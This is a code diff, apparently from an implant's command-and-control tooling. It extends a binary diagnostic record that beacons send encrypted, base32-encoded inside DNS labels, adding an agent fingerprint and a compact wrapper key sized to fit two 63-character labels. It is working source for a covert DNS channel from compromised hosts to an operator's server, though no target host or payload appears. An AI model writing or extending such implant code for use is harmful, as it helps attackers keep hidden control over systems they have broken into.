@@ -27,6 +27,7 @@ Stdlib only, like everything the implant's format touches.
 
 import base64
 import binascii
+import hashlib
 import math
 import struct
 from typing import Dict, Tuple
@@ -68,20 +69,29 @@ FLAG_DOT1X_SEEN = 0x02
 FLAG_PORTAL_ANSWERED = 0x04
 FLAG_DNS_ANSWERED = 0x08
 
-# version + (class, code) per transport + flags.
+# The key the record travels under. A dedicated key rather than an
+# `action` value, for one reason that is pure arithmetic: `{"action":
+# "rescue","d":...}` costs 125 base32 characters, which is two labels of
+# exactly 63 -- one byte of record growth from being undeliverable. `{"r":
+# ...}` costs 96 and leaves 101 characters for the zone. The server
+# therefore branches on this key before its action dispatch, which is an
+# explicit contract and not a guess about a payload's shape.
+WRAPPER_KEY = "r"
+
+# version + agent fingerprint + (class, code) per transport + flags.
 #
 # The code is two bytes, not one, and that is not generosity: an HTTP status
 # is the most useful code this record carries, and 407 — a proxy demanding
 # authentication — does not fit in a byte. Nor does any three-digit status
 # above 255. One byte would have meant dropping the best diagnostic or
 # encoding it as an offset a reader has to undo in their head.
-_STRUCT = struct.Struct("!BBHBHBHBHB")
+_STRUCT = struct.Struct("!BHBHBHBHBHB")
 RECORD_BYTES = _STRUCT.size
 
 # What the full chain produces, so a change to the record or to `_encrypt`'s
 # wrapper shows up as a failing assertion rather than a third label:
-#   14 bytes -> base64 20 -> {"d":"..."} 28 -> AES-GCM 56 -> base32 90
-PAYLOAD_CHARS = 90
+#   16 bytes -> base64 24 -> {"r":"..."} 32 -> AES-GCM 60 -> base32 96
+PAYLOAD_CHARS = 96
 
 # Two labels of 63. Past this the name would need a third, which no
 # listener parses, so it is refused rather than emitted.
@@ -91,7 +101,24 @@ _CLASS_VALUES = frozenset(CLASSES.values())
 _MAX_CODE = 0xFFFF
 
 
-def pack(per_transport: Dict[str, Tuple[int, int]], flags: int) -> bytes:
+def fingerprint(agent_id: str) -> int:
+    """Two bytes that identify which beacon is stuck.
+
+    The full id does not fit: thirty-two hex characters would cost sixty
+    base32 characters and a third label. Two bytes of a digest do, and the
+    server matches them against the agents it knows.
+
+    The cost is honest and small: with a fleet of a hundred, two agents
+    share a fingerprint about once in seven hundred, and the consequence is
+    one diagnostic attributed to the wrong beacon -- not a wrong command,
+    because nothing is dispatched from this.
+    """
+    digest = hashlib.sha256((agent_id or "").encode("utf-8", "replace"))
+    return int.from_bytes(digest.digest()[:2], "big")
+
+
+def pack(per_transport: Dict[str, Tuple[int, int]], flags: int,
+         agent_fingerprint: int = 0) -> bytes:
     """The record, as bytes. Missing transports read as `not_attempted`.
 
     Every bad value is refused rather than squeezed: a code outside two
@@ -116,7 +143,11 @@ def pack(per_transport: Dict[str, Tuple[int, int]], flags: int) -> bytes:
         fields.extend((int(klass), int(code)))
     if not 0 <= int(flags) <= 0xFF:
         raise ValueError("flags must fit in one byte (0-255), got %r" % (flags,))
-    return _STRUCT.pack(VERSION, *(fields + [int(flags)]))
+    if not 0 <= int(agent_fingerprint) <= 0xFFFF:
+        raise ValueError("agent_fingerprint must fit in two bytes, got %r"
+                         % (agent_fingerprint,))
+    return _STRUCT.pack(VERSION, int(agent_fingerprint),
+                        *(fields + [int(flags)]))
 
 
 def unpack(raw: bytes) -> dict:
@@ -133,9 +164,10 @@ def unpack(raw: bytes) -> dict:
     version = values[0]
     if version != VERSION:
         raise ValueError("record version %d is not %d" % (version, VERSION))
-    out = {"version": version, "flags": values[-1]}
+    out = {"version": version, "fingerprint": values[1],
+           "flags": values[-1]}
     for index, name in enumerate(TRANSPORTS):
-        out[name] = (values[1 + index * 2], values[2 + index * 2])
+        out[name] = (values[2 + index * 2], values[3 + index * 2])
     return out
 
 
